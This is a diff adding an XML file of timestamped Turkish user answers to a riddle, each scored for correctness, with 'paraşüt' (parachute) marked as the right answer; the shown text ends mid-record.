@@ -1,0 +1,2774 @@
+<?xml version="1.0" encoding="Windows-1254"?>
+<?xml-stylesheet type="text/xsl" href="bilmece_2009_02.xsl" ?>
+<CEVAPLAR>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 8.28</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>parsüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 8.28</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 8.33</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>elma</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 8.33</Zaman>
+    <Dogruluk>-1</Dogruluk>
+    <Metin>hava</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 8.34</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>bıçak</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 8.36</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>bıçak</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 8.36</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>bomba</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 8.36</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>silah</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 8.36</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>tüfek</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 8.39</Zaman>
+    <Dogruluk>-1</Dogruluk>
+    <Metin>gaz</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 8.40</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>gaz bombası</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 16.45</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>patates</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 16.46</Zaman>
+    <Dogruluk>-1</Dogruluk>
+    <Metin>hava</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 16.46</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>bomba</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.02.2010 Saat: 16.46</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>havan bombası</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>04.02.2010 Saat: 5.23</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>04.02.2010 Saat: 5.24</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>yol haritası</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>04.02.2010 Saat: 16.06</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>04.02.2010 Saat: 16.06</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>04.02.2010 Saat: 16.07</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>cetvel</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>04.02.2010 Saat: 16.07</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>açıölçer</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>04.02.2010 Saat: 16.11</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>04.02.2010 Saat: 16.11</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>04.02.2010 Saat: 16.35</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>07.02.2010 Saat: 4.03</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>07.02.2010 Saat: 4.04</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>07.02.2010 Saat: 4.04</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>telefon</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>08.02.2010 Saat: 14.35</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>vasiyeti</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>08.02.2010 Saat: 14.37</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>vasiyet namesi </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>10.02.2010 Saat: 16.11</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>10.02.2010 Saat: 16.12</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>saat</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>10.02.2010 Saat: 16.13</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>10.02.2010 Saat: 16.15</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>patika</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>10.02.2010 Saat: 16.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kestirme</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>10.02.2010 Saat: 16.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kesici</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>12.02.2010 Saat: 10.26</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.02.2010 Saat: 5.56</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ayın bilmecesi</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.02.2010 Saat: 5.56</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ayın bilmecesi</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>14.02.2010 Saat: 15.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>15.02.2010 Saat: 18.25</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>dürbün</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>15.02.2010 Saat: 18.25</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>cetvel</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>15.02.2010 Saat: 18.25</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>16.02.2010 Saat: 10.38</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>bu nasıl soru hocam:D</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 7.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Muhtemelen elinde dosdoğru gidebilmesini sağlayan yada ölmemek için dosdoğru gitmesini engelleyen bir pusula yada düzgün bir cubuk olabilir.</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 7.24</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>bir pusula olabilir çantasında</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 7.28</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>saatin bes dakikalık aralarındaki acıları bularak yolunu bulabilir</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 7.30</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>her 5 dakikada bir güneşin konumuna göre yön belirler</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 7.33</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>buldum saatin yelkovanını dönen bir dünya gibi düsünür saatin her beş dakikalık durumunda akrepe göre konumunu alır akrepin yer değiştirmesi kadar yönünü değiştirir.</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 7.33</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>buldum saatin yelkovanını dönen bir dünya gibi düsünür saatin her beş dakikalık durumunda akrepe göre konumunu alır akrepin yer değiştirmesi kadar yönünü değiştirir.</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 7.37</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>60 adım ileri yürür sonra saatin konumuna göre bir adım sağa yada sola adım atar </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 7.38</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>çantasında yönünü bulmak için bir gönye bulunur.</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 7.40</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>yanında bir tane otuz altmış doksan üçgeni olabilir.</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 7.44</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kronometre</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 7.51</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>harita</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 16.27</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 16.27</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>oleyy :)</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 16.27</Zaman>
+    <Dogruluk>-1</Dogruluk>
+    <Metin>hava</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 16.27</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>gayet mantıklı</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 16.28</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>bomba</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 16.28</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>bıçak</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 16.28</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kılıç</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.02.2010 Saat: 18.36</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>20.02.2010 Saat: 5.58</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>harita</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>20.02.2010 Saat: 5.59</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kitap</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>20.02.2010 Saat: 5.59</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>23.02.2010 Saat: 6.55</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>23.02.2010 Saat: 6.56</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.03.2010 Saat: 4.05</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>14.03.2010 Saat: 18.09</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>çantanın kolu</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>14.03.2010 Saat: 18.09</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>çantanın sapı</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>24.03.2010 Saat: 14.24</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>25.03.2010 Saat: 10.20</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>Açılmayan paraşüt! </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.04.2010 Saat: 7.37</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.04.2010 Saat: 7.37</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.04.2010 Saat: 7.37</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.04.2010 Saat: 7.42</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>harita</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.04.2010 Saat: 7.47</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.04.2010 Saat: 10.00</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>18.05.2010 Saat: 8.56</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.05.2010 Saat: 16.39</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>vasiyeti</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.05.2010 Saat: 16.39</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>27.07.2010 Saat: 4.14</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>yanlış yol haritası</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.07.2010 Saat: 18.01</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>28.09.2010 Saat: 12.13</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>çikolata</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>28.09.2010 Saat: 12.13</Zaman>
+    <Dogruluk>-1</Dogruluk>
+    <Metin>biber gazı</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>28.09.2010 Saat: 12.14</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>hipotenüs</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>07.11.2010 Saat: 16.06</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>catvel</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>09.11.2010 Saat: 18.32</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>23.01.2011 Saat: 19.18</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 21.59</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>lazer</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 21.59</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 21.59</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>fener</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 21.59</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>el feneri</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 22.00</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 22.00</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kamera</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 22.00</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>silah</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 22.01</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>lazer</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 22.01</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>bomba</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 22.03</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>çakmak</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 22.04</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>telsiz</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 22.04</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>para</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 22.04</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 22.04</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kitap</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 22.05</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>incil</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.02.2011 Saat: 22.05</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kuran</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>22.03.2011 Saat: 20.10</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kuranı kerim</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.05.2011 Saat: 21.39</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>08.06.2011 Saat: 9.28</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>silah</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>08.06.2011 Saat: 9.28</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>keser</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>08.06.2011 Saat: 9.28</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kestirme</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>08.06.2011 Saat: 9.29</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>08.06.2011 Saat: 9.29</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>hızar</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>09.08.2011 Saat: 11.25</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>patika</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>09.08.2011 Saat: 11.25</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>cetvel</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>09.08.2011 Saat: 11.25</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>09.08.2011 Saat: 11.26</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>saat</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>09.08.2011 Saat: 11.26</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>29.12.2011 Saat: 10.46</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>doğru</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.01.2012 Saat: 14.45</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.01.2012 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>para</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.01.2012 Saat: 10.17</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>et</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.01.2012 Saat: 10.18</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>silah</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.01.2012 Saat: 10.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.01.2012 Saat: 10.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>fener</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.01.2012 Saat: 10.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>harita</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>30.03.2012 Saat: 1.04</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>30.03.2012 Saat: 1.05</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>cetvel</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>22.04.2012 Saat: 15.52</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>arızalı bi paraşüt :P</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.05.2012 Saat: 1.54</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>silah</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.05.2012 Saat: 1.54</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>oksijen maskesi</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.05.2012 Saat: 1.54</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.05.2012 Saat: 1.54</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>para</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.05.2012 Saat: 1.54</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>05.12.2012 Saat: 8.02</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ateş yakabileceği bir şey</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.04.2013 Saat: 5.35</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>d</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>19.07.2013 Saat: 4.19</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>19.07.2013 Saat: 4.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>19.07.2013 Saat: 4.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>gönye</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>19.07.2013 Saat: 4.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.10.2013 Saat: 9.31</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.10.2013 Saat: 9.31</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pamuk</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.10.2013 Saat: 9.31</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>gönye</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.10.2013 Saat: 9.32</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>cetvel</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.10.2013 Saat: 9.35</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>23.10.2013 Saat: 2.54</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>23.10.2013 Saat: 2.55</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>Açılmayan paraşüt!</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>24.10.2013 Saat: 19.05</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>harita</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>24.10.2013 Saat: 19.06</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>uçakbileti</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>24.10.2013 Saat: 19.06</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>29.12.2013 Saat: 10.55</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>06.01.2014 Saat: 11.37</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su terazisi</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>06.01.2014 Saat: 11.37</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>anam</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>06.01.2014 Saat: 11.37</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ışık</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>06.01.2014 Saat: 11.38</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ask</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>06.01.2014 Saat: 11.39</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>06.01.2014 Saat: 11.40</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.01.2014 Saat: 10.38</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.01.2014 Saat: 10.39</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>cetvel</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>23.05.2014 Saat: 15.29</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>24.10.2014 Saat: 19.26</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>24.10.2014 Saat: 19.29</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Tohum</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>24.10.2014 Saat: 19.40</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Saat</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.11.2014 Saat: 8.48</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula olmalı. dosdoğru gidebilmesi için.</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.11.2014 Saat: 8.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>07.11.2014 Saat: 13.56</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>açılmayan paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>07.11.2014 Saat: 13.57</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>açılmayan paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>11.11.2014 Saat: 13.13</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
